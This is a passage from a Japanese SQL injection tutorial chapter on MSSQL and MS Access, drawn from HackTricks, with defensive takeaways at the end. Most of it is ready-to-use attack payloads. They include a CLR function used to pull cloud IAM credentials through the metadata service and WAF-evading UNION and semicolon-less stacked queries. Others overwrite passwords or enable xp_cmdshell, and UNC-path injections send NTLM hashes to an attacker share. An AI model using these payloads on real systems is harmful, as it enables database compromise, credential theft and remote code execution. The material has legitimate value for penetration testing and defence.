SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name IN ('VIEW SERVER STATE', 'VIEW SERVER PERFORMANCE STATE');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name IN ('VIEW DATABASE STATE', 'VIEW DATABASE PERFORMANCE STATE');
```

`xp_dirtree`が塞がれていても代替経路が残っているという事実は、「1つの既知の悪用経路をブロックしただけでは攻撃面は閉じない」という典型例であり、防御側は個別の関数・プロシージャの権限剥奪だけでなく、SQL Serverサービスアカウントからの意図しないアウトバウンド接続自体をネットワークレベルで遮断する必要がある。

> 出典: MSSQL Injection — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

### `xp_cmdshell`によるRCEとCLR UDF経由のHTTPリクエスト

`xp_cmdshell`（OSコマンドを直接実行できる拡張ストアドプロシージャ、デフォルトでは無効化されている）を使えば、SSRFを引き起こすコマンド（例えば`curl`や`nslookup`）をそのまま実行させることも可能である。`xp_cmdshell`自体の有効化手順や権限昇格の詳細は、MSSQLのネットワークサービスペンテストに関する章を参照されたい。

より高度な選択肢として、CLR UDF（Common Language Runtime User Defined Function、.NET言語で書かれ、DLLにコンパイルされてSQL Server内にロードされるカスタム関数）を作成する方法がある。これには`dbo`アクセス権が必要であり、実務上は`sa`または管理者ロールでの接続時にのみ現実的な手段となる。

[SQLHttpリポジトリ](https://github.com/infiniteloopltd/SQLHttp)で提供される`http.cs`の核心部分は次のとおりである。

```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
    [Microsoft.SqlServer.Server.SqlFunction]
    public static SqlString http(SqlString url)
    {
        var wc = new WebClient();
        var html = wc.DownloadString(url.Value);
        return new SqlString(html);
    }
}
```

`CREATE ASSEMBLY`を実行する前に、アセンブリのSHA512ハッシュをサーバーの信頼済みアセンブリ一覧（`select * from sys.trusted_assemblies;`で確認可能）に追加しておく必要がある。

```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```

アセンブリの追加と関数作成が完了すれば、任意のURLへHTTP GETリクエストを送信できる。

```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```

この例のURL（`169.254.169.254`）はクラウド環境のメタデータサービス（IMDS）の既知アドレスであり、CLR UDFを通じてSSRFを行い、SQL Serverが動作しているホスト（クラウドインスタンス）のIAM一時クレデンシャルを窃取しようとする典型的な攻撃パターンを示している。SQLインジェクションが最終的にクラウド基盤全体の侵害につながりうる、という点で極めて高いインパクトを持つ。

> 出典: MSSQL Injection — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

### 単一クエリでテーブル全体を抽出する`FOR JSON`テクニック

通常、SQLインジェクションで複数行・複数列のデータをまとめて抽出するにはXML化（`FOR XML`、`raw`モードなどの指定が必要でやや冗長）を使うことが多いが、`FOR JSON AUTO`句を使うとより簡潔に同じことができる。

`information_schema.columns`（全テーブル・カラムのメタ情報を保持するシステムビュー）からスキーマ・テーブル名・カラム名をまとめて取得する例:

```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```

エラーベースの文脈で使う場合は、式に必ずエイリアス（別名）を与える必要がある。`FOR JSON`はJSONオブジェクトのキー名を必要とするため、名前のない式（無名の計算結果）はJSON化できずエラーになるからである。

```sql
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```

`concat_ws(0x3a, ...)`はセパレータとして`0x3a`（コロン`:`のバイト表現）を使い複数カラムを1つの文字列に連結しており、これにより本来複数列に分かれるはずの情報を1列に押し込め、UNIONベースのカラム数制約を回避しつつ大量の情報を一度に持ち出せる。

### 実行中クエリの取得

`VIEW SERVER STATE`権限があれば、インスタンス上で実行中の全セッションを閲覧できる（権限がなければ自セッションのみ）。`sys.dm_exec_requests`と`sys.dm_exec_sql_text`を組み合わせることで、実行中のSQLクエリ本文そのものを取得できる。

```sql
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

これは他セッション（他ユーザーや管理ツールが発行した）クエリの内容を盗み見ることになり、接続文字列やハードコードされた認証情報がクエリ内に紛れ込んでいた場合、それらを丸ごと窃取できてしまう可能性がある。

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

> 出典: MSSQL Injection — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

### WAF回避の小技

MSSQLの構文パーサの「揺らぎ」を突くことで、正規表現ベースのシグネチャ検知を回避できる場合がある。

**非標準空白文字**（UTF-8としてエンコードされた空白類似文字）:

```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```

`%C2%85`（NEL, Next Line）や`%C2%A0`（NBSP, ノーブレークスペース）は、SQL Serverのパーサ上は通常の空白として扱われる一方、WAFのシグネチャが半角スペースやタブなど限られた文字種しか「空白」として認識していないと、`union`や`select`といった危険キーワードの前後に予期しない文字を挟むだけで検知をすり抜けられる。

**科学的記数法（`0e`）と16進表記（`0x`）によるUNIONの難読化**:

```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--
https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

数値リテラルの直後にキーワードが続く形はパーサが数値と識別子の境界を自動判定してくれるため、`0e` や `0x` と `union` の間に空白がなくても構文として成立する。WAFが「`union`の前に空白かスペース相当がある」ことを検知条件にしていると、この形は素通りしてしまう。

**`FROM`とカラム名の間をピリオドにする**:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

**`\N`をSELECTと使い捨てカラムの間のセパレータにする**:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

これらはいずれも「SQL構文として許容される空白・区切り文字の範囲」と「WAFのシグネチャが想定する空白・区切り文字の範囲」のズレを突く手法であり、本質的にはパーサの寛容さと検知ルールの厳格さの非対称性を利用している。

#### セミコロン不要のスタックドクエリ

[AWS WAF Clients Left Vulnerable to SQL Injection](https://gosecure.ai/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)（2023年6月公開、GoSecure社のブログ）で報告された手法によれば、MSSQLは`;`（セミコロン）なしでも複数の文を連続実行できる、という一般にあまり知られていない設計上の挙動がある。

```sql
SELECT 'a' SELECT 'b'
```

これは通常次のように書かれる複数文:

```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```

セミコロンなしで次のように圧縮できる。

```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

多くのWAFは「スタックドクエリ＝セミコロンで連結された複数文」という前提でシグネチャを組んでいるため、セミコロンを一切使わないこの形はその前提を裏切り検知をすり抜ける。実例として次のようなペイロードが紹介されている。

```sql
# Adding a useless exec() at the end and making the WAF think this isn't a valid query
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced options'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced options'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

最後の例は特に重要である。`sp_configure`を2回呼び出すことで「詳細オプションの表示を有効化」→「`xp_cmdshell`を有効化」という手順を、セミコロンなしの1本のペイロードに詰め込んでおり、これが成功すればOSコマンド実行（RCE）へ直結する。角括弧`[]`（SQL Serverの識別子区切り記号）やコメント`/**/`を空白の代替として使っている点も、前述のWAF回避テクニックと同じ発想である。

> 出典: MSSQL Injection — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

---

### MS Access（Jet/ACE）SQLインジェクション

MS AccessはWindows専用のデスクトップ向けデータベースエンジン（Jet 4.0、後継のACEエンジン）であり、`.mdb`/`.accdb`ファイルとして実体を持つ。Classic ASPなど古めのWebアプリケーションで今も稼働している例があり、MSSQLやMySQLとは大きく異なる制約と挙動を持つため専用の攻略パターンが必要になる。

#### 文字列連結とコメントの扱い

文字列連結は`&`（`%26`）と`+`（`%2b`）のどちらでも可能である。

```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```

MS Accessには他のRDBMSにあるような`--`や`/* */`のコメント構文が存在しない。その代わり、NULL文字（`%00`）を注入すると、それ以降のクエリ文字列が事実上無視される（アプリケーション側の文字列処理やAccessエンジンがNULL終端文字列として扱うため）という挙動を利用してクエリの残りを切り捨てられる。

```sql
1' union select 1,2 from table%00
```

これが機能しない場合は、構文エラーを起こさないよう末尾の構文を自分で正しく閉じる形にする。

```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```

#### スタックドクエリとLIMITの非対応

MS Accessは**スタックドクエリをサポートしない**。また**`LIMIT`演算子も実装されていない**。代わりに、返却する先頭N行を制限する`TOP`演算子を使う。

```sql
1' UNION SELECT TOP 3 attr FROM table%00
```

`TOP`と対をなす`LAST`演算子を使うと、末尾からの行を取得できる。この`TOP`+`LAST`の組み合わせは、後述する「特定の1行だけを狙い撃つ」ブラインドインジェクションの土台になる。

#### `FROM`句が必須という制約

MS Accessでは、サブクエリや追加クエリ内で**必ず`FROM`句を明示する**必要がある。したがって`UNION SELECT`や`UNION ALL SELECT`、あるいは条件式内の括弧付き`SELECT`を実行する際にも、有効なテーブル名を伴う`FROM`が必要になる。裏を返せば、**有効なテーブル名を1つも知らなければクエリを構文的に成立させられない**という、他のDBにはない強い制約がある。

```sql
-1' UNION SELECT username,password from users%00
```

#### チェーン等式＋Substringによるテーブル名不要の抽出

MS Accessは`'1'=2='3'='asd'=false`のような、一見奇妙な連鎖する等式（チェーン等式）構文を許容する。SQLインジェクションの注入箇所が多くの場合`WHERE`句の中にあることを利用し、これを悪用する。

カラム名`username`の存在を知っている、または推測できたとする。`Mid`関数（部分文字列を取得する関数）を使ったブール型インジェクション（真偽の違いをアプリケーションの応答差から読み取る手法）で、テーブル名を知らなくても現在のテーブルから値を抽出できる。

```sql
'=(Mid(username,1,3)='adm')='
```

テーブル名とカラム名の両方が分かっている場合は、`Mid`・`LAST`・`TOP`を組み合わせることで、任意の行の値をブールSQLiで丸ごとリークできる。

```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```

これは「`TOP 1`で先頭1行に絞り込んだサブクエリの、さらに`LAST`で末尾（=その1行）を取り出し、`Mid`で文字位置ごとに1文字ずつ比較する」という三段構えになっており、行の位置指定とカラム内の文字位置指定を`TOP`/`LAST`/`Mid`の組み合わせだけで実現している点がAccess特有の工夫である。

#### テーブル名・カラム名のブルートフォース

チェーン等式のテクニックを使えば、テーブル名自体もブルートフォースできる。

```sql
'=(select+top+1+'lala'+from+<table_name>)='
```

より伝統的な書き方も可能:

```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```

sqlmapが同梱する共通テーブル名リスト（`data/txt/common-tables.txt`）や、nibblesecが公開しているMS Access向けチートシートのワードリストも辞書として活用できる。

カラム名は、チェーン等式で:

```sql
'=column_name='
```

`GROUP BY`を使う方法もある。

```sql
-1' GROUP BY column_name%00
```

`GROUP BY`でのブルートフォースが機能するのは、存在しないカラム名を指定すると構文エラー（またはSELECT対象と集約指定の不整合エラー）が発生し、存在するカラム名なら正常応答になる、という応答の違いを利用できるためである。

別テーブルのカラム名をブルートフォースする場合:

```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```

#### `IIF`関数によるデータ抽出

```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```

`IIF(条件, 真の場合の値, 偽の場合の値)`はAccessにおけるif-then式であり、条件が真なら`200 OK`、偽なら`500 Internal Error`のような応答差をアプリケーション側に発生させるよう設計する。`TOP 10`で先頭10行に絞り、その中から`LAST`で10番目の行だけを狙い撃ちし、`MID`で1文字ずつ比較する。`TOP`の値と`MID`の開始位置を系統的に変えていけば、`username`列の全行・全文字を総当たりで復元できる。

#### 時間ベース（ブラインド）インジェクション

Jet/ACE SQLエンジン自体には、MySQLの`SLEEP()`やMSSQLの`WAITFOR DELAY`に相当するネイティブな遅延関数が**存在しない**。そのため従来型の時間ベースブラインドSQLiは制限される。ただし、エンジンにネットワークリソースへのアクセスを強制することで、間接的に測定可能な遅延を発生させられる。応答を返す前にファイル（データベース）を開こうとするエンジンの挙動を利用し、HTTPの応答時間が攻撃者制御ホストへの往復遅延を反映するようにする。

```sql
' UNION SELECT 1 FROM SomeTable IN '\\10.10.14.3\doesnotexist\dummy.mdb'--
```

UNCパスの参照先として次のようなものを指定すると効果的である。

- 高レイテンシ回線の先にあるSMB共有
- `SYN-ACK`の後にTCPハンドシェイクを故意に放棄するホスト
- ファイアウォールのシンクホール（パケットを受けて応答しないブラックホール）

こうして生じる数秒単位の遅延を、ブール条件に応じて「遅いパスを選ぶかどうか」を切り替えるオラクルとして使えば、帯域外タイミングオラクルとしてブラインドインジェクションが成立する。Microsoftはこのリモートデータベース参照の挙動と、それを無効化するレジストリのキルスイッチについてKB5002984で公式に説明している。

#### その他の有用な関数

- `Mid('admin',1,1)` — 部分文字列取得（開始位置1、長さ1。Accessでは文字列の先頭位置は1から数える）
- `LEN('1234')` — 文字列長取得
- `ASC('A')` — 文字のASCIIコード値取得
- `CHR(65)` — ASCIIコード値から文字取得
- `IIF(1=1,'a','b')` — if-then式
- `COUNT(*)` — 件数カウント

#### テーブルの列挙

```sql
select MSysObjects.name
from MSysObjects
where
   MSysObjects.type In (1,4,6)
   and MSysObjects.name not like '~*'
   and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```

`MSysObjects`はAccessの全オブジェクト（テーブル、クエリ等）のメタデータを保持するシステムテーブルであり、`type`カラムでオブジェクト種別を、`~*`や`MSys*`の除外条件でシステム内部オブジェクトを除いた実テーブルのみを絞り込んでいる。ただし、SQLインジェクションが発生している環境では、権限設定により`MSysObjects`自体への読み取りアクセスがそもそも許可されていないケースが非常に多い点に注意が必要である。その場合は前述のテーブル名ブルートフォースに頼ることになる。

#### ファイルシステムへのアクセス

**Webルートの絶対パス特定**: アプリケーションのエラーメッセージが完全に隠蔽されていない場合、存在しないデータベースへの参照を試みることでWebルートの絶対パスが判明することがある。

```
http://localhost/script.asp?id=1'+ '+UNION+SELECT+1+FROM+FakeDB.FakeTable%00
```

MS Accessは、このクエリに対してWebディレクトリのフルパスを含むエラーメッセージを返すことがある。

**ファイル存在の推測（File Enumeration）**: 次のベクタはリモートファイルシステム上のファイル存在を推測するために使える。指定ファイルが存在すると、データベース形式が不正だというエラーメッセージがトリガーされる。

```
http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00
```

別の方法として、`database.table`形式で項目を指定するやり方もある。指定ファイルが存在すれば、データベース形式エラーメッセージが表示される。

```
http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00
```

**`.mdb`ファイル名の推測**:

```
http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00
```

`name[i]`は推測する`.mdb`ファイル名、`realTable`はデータベース内に実在するテーブル名である。この場合、MS Accessは常に何らかのエラーメッセージを返すが、そのエラーメッセージの文言や種類によって「無効なファイル名」と「有効な`.mdb`ファイル名」を区別できる。

#### リモートデータベースアクセスとNTLM資格情報窃取（2023年に再検証）

Jet 4.0以降、クエリは`IN '<path>'`句を使って**別の`.mdb`/`.accdb`ファイル**にあるテーブルを参照できる。

```sql
SELECT first_name FROM Employees IN '\\server\share\hr.accdb';
```

もし`IN`以降の部分にユーザー入力が結合されていたり、`JOIN … IN`/`OPENROWSET`/`OPENDATASOURCE`の呼び出しに入力が混入していたりすると、攻撃者は自身が制御するホストを指すUNCパスを指定できる。この場合、Accessエンジンは次のような一連の動作を行う。

1. リモートデータベースを開くためSMB/HTTP経由の認証を試みる。
2. その過程でWebサーバーのNTLM資格情報が強制認証（forced authentication、被害者側から能動的に認証情報を差し出させる攻撃パターン）によって漏洩する。
3. リモートファイルをパースしようとする。細工された、あるいは破損したデータベースファイルはJet/ACEエンジンのメモリ破損バグ（例: CVE-2021-28455）を突く経路になりうる。

実際の注入例:

```sql
1' UNION SELECT TOP 1 name
   FROM MSysObjects
   IN '\\attacker\share\poc.mdb'-- -
```

影響としては、

- Net-NTLMv2ハッシュの帯域外流出（リレー攻撃やオフラインクラッキングに利用可能）
- Jet/ACEパーサの新規バグが悪用された場合のリモートコード実行の可能性

が挙げられる。防御策としては次が推奨される（レガシーなClassic ASPアプリケーションであっても実施すべき）。

- レジストリ値`AllowQueryRemoteTables`を`0`に設定する（`HKLM\Software\Microsoft\Jet\4.0\Engines`配下、および対応するACEのパス配下）。これによりJet/ACEは`\\`で始まるリモートパスを拒否するようになる。
- ネットワーク境界でアウトバウンドのSMB/WebDAV通信を遮断する。
- `IN`句に入り込みうるクエリ部分を、必ずサニタイズ・パラメータ化する。

この強制認証ベクタは、2023年にCheck Point Researchによって再検証されており、レジストリキーが未設定の完全パッチ適用済みWindows Serverでも依然として悪用可能であることが実証されている。SQLインジェクションという「データベースの脆弱性」が、ネットワーク認証プロトコル（NTLM）の弱点と組み合わさることで、Web層の脆弱性がActive Directory環境全体への侵害の足がかりになりうる好例である。

#### `.mdb`パスワードクラッカー

[Access PassView](https://www.nirsoft.net/utils/accesspv.html)は、Microsoft Access 95/97/2000/XPやJet Database Engine 3.0/4.0のメインデータベースパスワードを復元できる無償ツールである。SQLインジェクションでファイルシステム経由の探索などによって`.mdb`ファイルそのものへアクセスできた場合、その保護パスワードを突破する手段として利用できる。

> 出典: MS Access SQL Injection — https://hacktricks.wiki/en/pentesting-web/sql-injection/ms-access-sql-injection.html

### まとめと防御上の要点

MSSQL/MS Accessいずれの節にも共通するのは、「汎用的なUNIONベース・ブールベースのSQLi対策だけでは不十分」という点である。防御側は以下を押さえておく必要がある。

- **最小権限の原則を関数・プロシージャ単位で徹底する**: `VIEW SERVER STATE`、`CONTROL SERVER`、`ADMINISTER BULK OPERATIONS`、`bulkadmin`ロールなどは、SSRFやOOB抽出の踏み台になりうる。不要な権限は剥奪し、剥奪後も代替経路（DMF等）が残っていないか継続的に確認する。
- **アウトバウンド接続そのものを制限する**: `xp_dirtree`個別の無効化だけでなく、SQL Serverサービスアカウントからの不要なSMB/HTTP/DNSアウトバウンド通信をネットワーク境界でブロックすることが、個々の関数の抜け道を塞ぐより本質的な対策になる。
- **WAFのシグネチャに依存しすぎない**: 空白文字の揺らぎやセミコロンなしのスタックドクエリなど、パーサの寛容さを突く手法は今後も新しいバリエーションが出続ける。根本対策はプリペアドステートメント（パラメータ化クエリ）の徹底であり、WAFは多層防御の一部と位置づける。
- **レガシーなJet/ACE環境では`AllowQueryRemoteTables`を必ず無効化する**: Classic ASP等の古いアプリケーションが稼働し続けている環境では、パッチ適用状況にかかわらずレジストリ設定の確認が欠かせない。

---

[← 第3章 Blind SQLi：boolean・time-based・OOB/OAST](03-blind.md) ｜ [📖 目次](index.md) ｜ [第5章 WAF回避／フィルタバイパス →](05-waf-bypass.md)
